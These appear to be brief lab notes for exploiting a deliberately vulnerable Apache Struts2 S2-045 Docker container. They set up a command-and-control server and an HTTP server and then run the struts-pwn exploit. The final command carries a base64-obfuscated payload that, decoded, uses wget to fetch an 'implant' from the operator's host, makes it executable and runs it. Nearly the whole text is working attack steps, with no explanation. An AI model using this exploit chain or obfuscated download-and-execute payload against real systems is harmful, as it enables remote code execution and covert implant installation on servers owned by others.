Create a .env with
```
IP=192.168.65.254 (docker ip)
PORT=4444
```
Run:
```
docker pull medicean/vulapps:s_struts2_s2-045
docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-045
```
```
In powershell:
python c2_server.py
```
```
In powershell:
python -m http.server 8000
```
```
In WSL!!
cd struts-pwn
python3 struts-pwn.py --url http://localhost:8080/memocreate.action   --cmd "echo d2dldCBodHRwOi8vMTkyLjE2OC42NS4yNTQ6ODAwMC9pbXBsYW50IC1PIC90bXAvaSAmJiBjaG1vZCAreCAvdG1wL2kgJiYgL3RtcC9p | base64 -d | bash"
```
